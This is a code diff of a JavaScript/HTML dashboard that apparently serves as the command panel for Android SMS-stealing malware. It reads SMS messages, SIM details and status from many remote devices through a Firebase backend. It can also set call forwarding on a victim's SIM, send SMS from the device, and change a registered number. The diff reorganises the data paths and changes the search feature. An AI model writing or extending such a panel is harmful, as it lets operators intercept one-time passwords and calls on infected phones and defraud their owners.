@@ -122,8 +122,8 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
       <input id="cfg-key" type="password" placeholder="AIzaSy..." /></div>
     <div class="fg"><label>Project ID</label>
       <input id="cfg-pid" placeholder="your-project-id" /></div>
-    <div class="fg"><label>Main Node (default: csc6)</label>
-      <input id="cfg-node" value="csc6" /></div>
+    <div class="fg"><label>Main Node (default: Verify_Device/csc6)</label>
+      <input id="cfg-node" value="Verify_Device/csc6" /></div>
     <button class="pbtn" id="setup-btn" onclick="doSetup()">🔗 Connect</button>
     <div class="errbox" id="setup-err"></div>
   </div>
@@ -139,7 +139,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
   <div class="search-sec">
     <div class="sw">
       <span class="si">🔍</span>
-      <input id="global-search" placeholder="Search SMS across all devices..." oninput="onSearch(this.value)" />
+      <input id="global-search" placeholder="Search devices..." oninput="onSearch(this.value)" />
       <button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button>
     </div>
   </div>
@@ -215,7 +215,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);mi
 </div>
 <div id="toast"></div>
 <script>
-var DB_URL='', API_KEY='', ROOT_NODE='csc6';
+var DB_URL='', API_KEY='', ROOT_NODE='Verify_Device/csc6';
 var DEVICES={}, currentDeviceKey=null, selectedSim=0, toastTimer=null;
 var pollTimer=null, isSearchMode=false;
 function fbGet(path){
@@ -239,11 +239,11 @@ function doSetup(){
   DB_URL=document.getElementById('cfg-url').value.trim().replace(/\/$/,'');
   API_KEY=document.getElementById('cfg-key').value.trim();
   var pid=document.getElementById('cfg-pid').value.trim();
-  ROOT_NODE=document.getElementById('cfg-node').value.trim()||'csc6';
+  ROOT_NODE=document.getElementById('cfg-node').value.trim()||'Verify_Device/csc6';
   if(!DB_URL||!API_KEY||!pid){showSetupErr('Sab fields zaroori hain!');return;}
   var btn=document.getElementById('setup-btn');
   btn.disabled=true; btn.textContent='Connecting...';
-  fbGet(ROOT_NODE+'/All_User').then(function(data){
+  fbGet(ROOT_NODE+'/All_User/Info').then(function(infoData){
     document.getElementById('setup-screen').style.display='none';
     var app=document.getElementById('app');
     app.style.display='flex'; app.style.flexDirection='column';
@@ -251,7 +251,7 @@ function doSetup(){
     startPolling();
     showToast('Connected ✅');
   }).catch(function(e){
-    showSetupErr('Connection failed: '+e.message+' - URL/API Key check karo.');
+    showSetupErr('Connection failed: '+e.message+' - Check URL/API Key');
     btn.disabled=false; btn.textContent='🔗 Connect';
   });
 }
@@ -279,37 +279,45 @@ function objToArr(obj){
   var arr=[]; Object.keys(obj).forEach(function(k){arr.push(obj[k]);}); return arr;
 }
 function loadData(){
-  fbGet(ROOT_NODE+'/All_User').then(function(data){
-    if(!data){document.getElementById('device-list').innerHTML='<div class="empty"><div class="ei">📱</div><p>Koi data nahi mila.</p></div>';return;}
+  Promise.all([
+    fbGet(ROOT_NODE+'/All_User/Info'),
+    fbGet(ROOT_NODE+'/All_User/Sms'),
+    fbGet(ROOT_NODE+'/All_User/SimINFO'),
+    fbGet(ROOT_NODE+'/All_User/Call_For'),
+    fbGet(ROOT_NODE+'/RegisterNo')
+  ]).then(function(results){
+    var infoData=results[0]||{};
+    var smsData=results[1]||{};
+    var simData=results[2]||{};
+    var callData=results[3]||{};
+    var regNo=results[4]||'—';
+    document.getElementById('register-bar').textContent='Register : '+regNo;
     DEVICES={};
     var totalSms=0, online=0;
-    var keys=Object.keys(data);
-    keys.forEach(function(k){
-      var v=data[k];
-      if(typeof v!=='object'||!v) return;
-      var info=v.Info||{};
-      var smsRaw=v.Sms||{};
-      var sim=v.SimINFO||v.SimInfo||v.simInfo||{};
+    var deviceIds=Object.keys(infoData);
+    deviceIds.forEach(function(deviceId){
+      var info=infoData[deviceId]||{};
+      var smsRaw=smsData[deviceId]||{};
+      var sim=simData[deviceId]||{};
       var smsArr=objToArr(smsRaw);
       totalSms+=smsArr.length;
-      var st=String(info.Status||v.Status||info.status||'').toLowerCase();
+      var st=String(info.Status||info.status||'').toLowerCase();
       var isOnline=(st==='online'||st==='1'||st=='true');
       if(isOnline) online++;
-      DEVICES[k]={key:k,
-        name:info.MobileName||info.mobileName||info.DeviceName||info.name||k,
-        id:info.DeviceId||info.deviceId||info.device_id||k,
+      DEVICES[deviceId]={
+        key:deviceId,
+        name:info.MobileName||info.mobileName||info.DeviceName||info.name||deviceId,
+        id:info.DeviceId||info.deviceId||info.device_id||deviceId,
         battery:info.Battery||info.battery||'—',
         status:isOnline?'online':'offline',
-        sms:smsArr,simInfo:sim,callFor:v.Call_For||{},raw:v};
+        sms:smsArr, simInfo:sim,
+        callFor:callData[deviceId]||{},
+        info:info
+      };
     });
-    document.getElementById('s-total').textContent=Object.keys(DEVICES).length;
+    document.getElementById('s-total').textContent=deviceIds.length;
     document.getElementById('s-online').textContent=online;
     document.getElementById('s-sms').textContent=totalSms;
-    var anyDev=Object.values(DEVICES)[0];
-    if(anyDev&&anyDev.raw){
-      var reg=anyDev.raw.RegisterNo||anyDev.raw.registerNo||anyDev.raw.Register_No||anyDev.raw.register||'—';
-      document.getElementById('register-bar').textContent='Register : '+reg;
-    }
     renderDeviceList();
   }).catch(function(e){
     console.error('Load error:',e);
@@ -319,7 +327,7 @@ function renderDeviceList(){
   var container=document.getElementById('device-list');
   var devs=Object.values(DEVICES);
   if(devs.length===0){
-    container.innerHTML='<div class="empty"><div class="ei">📱</div><p>No devices found.</p></div>';
+    container.innerHTML='<div class="empty"><div class="ei">📱</div><p>No devices found</p></div>';
     return;
   }
   devs.sort(function(a,b){
@@ -396,41 +404,28 @@ function goBack(){
 }
 function onSearch(val){
   var clearBtn=document.getElementById('search-clear-btn');
-  if(val.trim().length===0){
-    clearBtn.style.display='none';
-    if(isSearchMode){goBack();}
-    return;
-  }
-  clearBtn.style.display='block';
-  isSearchMode=true;
+  if(val.trim().length===0){clearBtn.style.display='none';if(isSearchMode){goBack();}return;}
+  clearBtn.style.display='block'; isSearchMode=true;
   var q=val.toLowerCase().trim();
   var results=[];
   Object.values(DEVICES).forEach(function(dev){
-    (dev.sms||[]).forEach(function(sms){
-      var addr=String(sms.Address||sms.address||sms.from||sms.From||sms.sender||'');
-      var body=String(sms.Body||sms.body||sms.msg||sms.Msg||sms.message||'');
-      var time=String(sms.Time||sms.time||sms.date||sms.Date||'');
-      if(addr.toLowerCase().indexOf(q)!==-1 || body.toLowerCase().indexOf(q)!==-1 || time.toLowerCase().indexOf(q)!==-1){
-        results.push({device:dev, sms:sms, address:addr, body:body, time:time});
-      }
-    });
+    if(dev.name.toLowerCase().indexOf(q)!==-1 || dev.id.toLowerCase().indexOf(q)!==-1 || dev.key.toLowerCase().indexOf(q)!==-1){
+      results.push(dev);
+    }
   });
-  document.getElementById('search-summary').textContent=results.length+' result(s) for "'+val+'"';
+  document.getElementById('search-summary').textContent=results.length+' device(s) found for "'+val+'"';
   var container=document.getElementById('search-results-list');
   if(results.length===0){
     container.innerHTML='<div class="empty"><div class="ei">🔍</div><p>No results found</p></div>';
     return;
   }
   var html='';
-  results.forEach(function(r){
-    var highlightBody=highlightMatch(r.body,q);
-    var highlightAddr=highlightMatch(r.address,q);
-    html+='<div class="src-card" onclick="openDevice(\''+r.device.key+'\')">'+
-      '<span class="sdlbl">📱 '+escHtml(r.device.name)+'</span>'+
-      '<span class="smcnt">'+escHtml(r.device.id)+'</span>'+
-      '<div class="sadr">📩 '+highlightAddr+'</div>'+
-      '<div class="sbody">'+highlightBody+'</div>'+
-      '<div class="stime">🕐 '+escHtml(r.time)+'</div>'+
+  results.forEach(function(dev,idx){
+    var stClass=dev.status==='online'?'son':'soff';
+    html+='<div class="src-card" onclick="openDevice(\''+dev.key+'\')">'+
+      '<span class="sdlbl">📱 '+escHtml(dev.name)+'</span>'+
+      '<span class="smcnt">'+escHtml(dev.id)+'</span>'+
+      '<div class="dstat '+stClass+'">'+(dev.status==='online'?'🟢 Online':'🔴 Offline')+' | 🔋 '+escHtml(String(dev.battery))+' | '+dev.sms.length+' SMS</div>'+
     '</div>';
   });
   container.innerHTML=html;
@@ -440,28 +435,15 @@ function onSearch(val){
   ss.style.display='flex'; ss.style.flexDirection='column';
   stopPolling();
 }
-function highlightMatch(text, q){
-  var s=escHtml(String(text));
-  if(!q) return s;
-  var regex=new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi');
-  return s.replace(regex,'<span class="highlight">$1</span>');
-}
 function clearSearch(){
   document.getElementById('global-search').value='';
   document.getElementById('search-clear-btn').style.display='none';
-  isSearchMode=false;
-  goBack();
-  startPolling();
+  isSearchMode=false; goBack(); startPolling();
 }
-function refreshData(){
-  if(isSearchMode) return;
-  loadData();
-  showToast('Refreshed ✅');
-}
+function refreshData(){if(isSearchMode) return; loadData(); showToast('Refreshed ✅');}
 function openCallFwd(){
   if(!currentDeviceKey) return;
-  var dev=DEVICES[currentDeviceKey];
-  if(!dev) return;
+  var dev=DEVICES[currentDeviceKey]; if(!dev) return;
   selectedSim=0;
   var sims=dev.simInfo;
   var simList=document.getElementById('sim-list');
@@ -479,8 +461,7 @@ function openCallFwd(){
       html+='<div class="sim-opt'+selClass+'" onclick="selectSim('+idx+')">'+
         '<div class="sim-ic">📶</div>'+
         '<div class="sim-inf"><div class="sim-nm">SIM '+(idx+1)+'</div><div class="sim-no">'+escHtml(String(number))+' | '+escHtml(String(operator))+'</div></div>'+
-        '<div class="sim-rb'+chkClass+'"></div>'+
-      '</div>';
+        '<div class="sim-rb'+chkClass+'"></div></div>';
     });
     simList.innerHTML=html;
   }
@@ -492,89 +473,45 @@ function selectSim(idx){selectedSim=idx;openCallFwd();}
 function doCF(action){
   if(!currentDeviceKey){showToast('No device selected');return;}
   var dev=DEVICES[currentDeviceKey];
-  var sims=dev.simInfo;
-  var simKeys=sims?Object.keys(sims):[];
+  var sims=dev.simInfo; var simKeys=sims?Object.keys(sims):[];
   var number=document.getElementById('cf-number').value.trim();
   var resBox=document.getElementById('cf-result');
   if(action==='check'){
-    var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For';
-    fbGet(path).then(function(data){
+    fbGet(ROOT_NODE+'/All_User/Call_For/'+currentDeviceKey).then(function(data){
       resBox.style.display='block';
-      if(data){
-        resBox.innerHTML='✅ CF Status: <b>'+escHtml(JSON.stringify(data))+'</b>';
-        resBox.style.background='#f0fdf4'; resBox.style.border='1px solid #bbf7d0'; resBox.style.color='#15803d';
-      } else {
-        resBox.innerHTML='ℹ️ No call forwarding data';
-        resBox.style.background='#eff6ff'; resBox.style.border='1px solid #bfdbfe'; resBox.style.color='#1d4ed8';
-      }
+      if(data){resBox.innerHTML='✅ CF Status: <b>'+escHtml(JSON.stringify(data))+'</b>';resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';}
+      else {resBox.innerHTML='No call forwarding data';resBox.style.background='#eff6ff';resBox.style.border='1px solid #bfdbfe';resBox.style.color='#1d4ed8';}
       showToast('CF Status checked');
-    }).catch(function(e){
-      resBox.style.display='block';
-      resBox.innerHTML='❌ Error: '+e.message;
-      resBox.style.background='#fef2f2'; resBox.style.border='1px solid #fecaca'; resBox.style.color='#b91c1c';
-    });
+    }).catch(function(e){resBox.style.display='block';resBox.innerHTML='Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';});
     return;
   }
-  if(!number && action!=='deactive'){showToast('Please enter a number!'); return;}
+  if(!number && action!=='deactive'){showToast('Please enter a number!');return;}
   var simNum='';
-  if(simKeys.length>0){
-    var selSim=sims[simKeys[selectedSim]];
-    simNum=selSim.Number||selSim.number||selSim.phone||selSim.Phone||simKeys[selectedSim];
-  }
-  var cfData={
-    action:action,
-    number:number||'',
-    sim:simNum,
-    simIndex:selectedSim,
-    timestamp:new Date().toISOString()
-  };
-  var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For';
-  fbSet(path, cfData).then(function(){
-    resBox.style.display='block';
-    resBox.innerHTML='✅ Call Forwarding <b>'+action.toUpperCase()+'</b> set for '+escHtml(number||simNum);
-    resBox.style.background='#f0fdf4'; resBox.style.border='1px solid #bbf7d0'; resBox.style.color='#15803d';
-    showToast('CF '+action+' ✅');
-  }).catch(function(e){
-    resBox.style.display='block';
-    resBox.innerHTML='❌ Error: '+e.message;
-    resBox.style.background='#fef2f2'; resBox.style.border='1px solid #fecaca'; resBox.style.color='#b91c1c';
-    showToast('CF failed ❌');
-  });
+  if(simKeys.length>0){var selSim=sims[simKeys[selectedSim]];simNum=selSim.Number||selSim.number||selSim.phone||selSim.Phone||simKeys[selectedSim];}
+  var cfData={action:action,number:number||'',sim:simNum,simIndex:selectedSim,timestamp:new Date().toISOString()};
+  fbSet(ROOT_NODE+'/All_User/Call_For/'+currentDeviceKey, cfData).then(function(){
+    resBox.style.display='block';resBox.innerHTML='✅ Call Forwarding <b>'+action.toUpperCase()+'</b> set for '+escHtml(number||simNum);
+    resBox.style.background='#f0fdf4';resBox.style.border='1px solid #bbf7d0';resBox.style.color='#15803d';showToast('CF '+action+' ✅');
+  }).catch(function(e){resBox.style.display='block';resBox.innerHTML='Error: '+e.message;resBox.style.background='#fef2f2';resBox.style.border='1px solid #fecaca';resBox.style.color='#b91c1c';showToast('CF failed');});
 }
-function openSmsSend(){
-  document.getElementById('sms-to').value='';
-  document.getElementById('sms-msg').value='';
-  openDialog('dlg-sms');
-}
+function openSmsSend(){document.getElementById('sms-to').value='';document.getElementById('sms-msg').value='';openDialog('dlg-sms');}
 function doSendSms(){
   if(!currentDeviceKey){showToast('No device selected');return;}
   var to=document.getElementById('sms-to').value.trim();
   var msg=document.getElementById('sms-msg').value.trim();
   if(!to||!msg){showToast('Number and message required!');return;}
   var smsData={To:to,Msg:msg,Time:new Date().toISOString(),Status:'pending',Direction:'outgoing'};
-  var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Sms_Send';
-  fbSet(path, smsData).then(function(){
-    showToast('SMS sent ✅');
-    closeDialog('dlg-sms');
-  }).catch(function(e){
-    showToast('SMS failed ❌ '+e.message);
-  });
+  fbSet(ROOT_NODE+'/All_User/Sms/'+currentDeviceKey+'/'+Date.now(), smsData).then(function(){
+    showToast('SMS sent ✅');closeDialog('dlg-sms');
+  }).catch(function(e){showToast('SMS failed: '+e.message);});
 }
-function openUpdateNo(){
-  document.getElementById('update-num').value='';
-  openDialog('dlg-update');
-}
+function openUpdateNo(){document.getElementById('update-num').value='';openDialog('dlg-update');}
 function doUpdateNo(){
   var num=document.getElementById('update-num').value.trim();
   if(!num){showToast('Number required!');return;}
-  var path=ROOT_NODE+'/RegisterNo';
-  fbSet(path, num).then(function(){
-    showToast('Register number updated ✅');
-    closeDialog('dlg-update');
-    loadData();
-  }).catch(function(e){
-    showToast('Update failed ❌ '+e.message);
-  });
+  fbSet(ROOT_NODE+'/RegisterNo', num).then(function(){
+    showToast('Register updated ✅');closeDialog('dlg-update');loadData();
+  }).catch(function(e){showToast('Update failed: '+e.message);});
 }
 function openDialog(id){document.getElementById(id).style.display='flex';}
 function closeDialog(id){document.getElementById(id).style.display='none';}
